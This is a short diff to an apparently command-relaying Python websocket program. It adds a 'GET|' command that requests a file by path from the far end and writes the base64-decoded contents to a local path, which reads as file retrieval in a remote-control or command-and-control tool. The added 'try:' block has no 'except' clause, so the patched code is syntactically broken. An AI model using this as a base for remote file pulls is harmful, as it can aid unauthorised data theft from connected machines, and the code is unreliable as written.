@@ -29,6 +29,21 @@ async def hello():
 
                 # freeze until transfer done
                 await websocket.recv()
+
+            if(server.startswith("GET|")):
+                try:
+                    split = server.split("|")
+
+                    source = split[1]
+                    destination = split[2]
+
+                    await websocket.send("GET|" + source)
+                    
+                    data = base64.b64decode((await websocket.recv()).encode("utf-8"))
+
+                    f = open(destination, 'wb')
+                    f.write(data)
+                    f.close()
             
             if(data_to_send.startswith("CMD|")):
                 await websocket.send(data_to_send)
